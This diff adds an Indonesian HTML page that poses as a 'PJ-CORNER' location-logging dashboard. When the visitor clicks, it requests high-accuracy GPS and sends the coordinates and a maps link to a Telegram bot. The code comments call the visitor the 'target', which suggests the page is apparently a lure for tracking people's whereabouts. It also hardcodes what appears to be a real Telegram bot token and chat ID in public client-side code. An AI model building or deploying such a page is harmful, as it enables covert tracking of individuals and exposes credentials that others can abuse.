@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PJ-CORNER | Sistem Log Lokasi</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f6;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .dashboard-card {
+            background: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            border-top: 5px solid #007bff;
+        }
+        h2 { margin-top: 0; color: #007bff; }
+        p { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.5; }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            transition: 0.3s;
+        }
+        button:hover { background-color: #0056b3; }
+        button:disabled { background-color: #cccccc; cursor: not-allowed; }
+        #status { margin-top: 15px; font-weight: bold; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+    <div class="dashboard-card">
+        <h2>PJ-CORNER Log</h2>
+        <p>Gunakan sistem ini untuk mencatat koordinat lokasi unit saat ini. Sistem akan meminta izin akses GPS sebelum mengirimkan data ke Server Admin.</p>
+        
+        <button id="btnLacak" onclick="eksekusiLacak()">📍 Catat & Kirim Lokasi</button>
+        <div id="status">Status: Menunggu instruksi...</div>
+    </div>
+
+    <script>
+        // ==========================================
+        // KONFIGURASI TELEGRAM (ISI BAGIAN INI)
+        // ==========================================
+        const TOKEN = "8723151330:AAErbt_mTiPZrlBcudjRr41CgSTCGt7jqFc"; 
+        const CHAT_ID = "5485985282";
+        // ==========================================
+
+        const btn = document.getElementById("btnLacak");
+        const statusTeks = document.getElementById("status");
+
+        function eksekusiLacak() {
+            btn.disabled = true;
+            statusTeks.innerHTML = "Meminta izin lokasi...";
+            statusTeks.style.color = "#d39e00";
+
+            if (navigator.geolocation) {
+                // Konfigurasi tambahan agar GPS lebih akurat
+                const opsiGeoloc = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                };
+
+                navigator.geolocation.getCurrentPosition(berhasil, gagal, opsiGeoloc);
+            } else {
+                statusTeks.innerHTML = "Browser ini tidak mendukung pelacakan lokasi.";
+                statusTeks.style.color = "red";
+                btn.disabled = false;
+            }
+        }
+
+        // Fungsi jika target mengizinkan akses lokasi
+        function berhasil(posisi) {
+            statusTeks.innerHTML = "Lokasi ditemukan! Mengirim ke Telegram...";
+            statusTeks.style.color = "blue";
+
+            let lat = posisi.coords.latitude;
+            let lon = posisi.coords.longitude;
+            let waktu = new Date().toLocaleString("id-ID");
+
+            // Format pesan rapi untuk Telegram
+            let pesan = `📝 <b>LOG LOKASI BARU</b>\n\n` +
+                        `<b>Sistem:</b> PJ-CORNER Management\n` +
+                        `<b>Waktu:</b> ${waktu}\n` +
+                        `<b>Koordinat:</b> <code>${lat}, ${lon}</code>\n\n` +
+                        `🗺️ <b>Buka di Peta:</b>\n` +
+                        `https://www.google.com/maps?q=${lat},${lon}`;
+
+            kirimKeTelegram(pesan);
+        }
+
+        // Fungsi penanganan error jika diblokir target
+        function gagal(error) {
+            btn.disabled = false;
+            statusTeks.style.color = "red";
+            if (error.code == error.PERMISSION_DENIED) {
+                statusTeks.innerHTML = "Gagal: Izin lokasi ditolak oleh pengguna.";
+            } else {
+                statusTeks.innerHTML = "Gagal: Tidak dapat menjangkau satelit/jaringan.";
+            }
+        }
+
+        // Fungsi Fetch API ke Telegram
+        function kirimKeTelegram(teksPesan) {
+            const url_api = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+            
+            fetch(url_api, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: teksPesan,
+                    parse_mode: "HTML"
+                })
+            })
+            .then(response => {
+                if(response.ok) {
+                    statusTeks.innerHTML = "✅ Data berhasil dikirim ke Admin!";
+                    statusTeks.style.color = "green";
+                } else {
+                    statusTeks.innerHTML = "❌ Gagal terhubung ke Telegram.";
+                    statusTeks.style.color = "red";
+                }
+                setTimeout(() => { btn.disabled = false; }, 3000);
+            })
+            .catch(err => {
+                statusTeks.innerHTML = "❌ Terjadi kesalahan jaringan.";
+                statusTeks.style.color = "red";
+                btn.disabled = false;
+            });
+        }
+    </script>
+
+</body>
+</html>
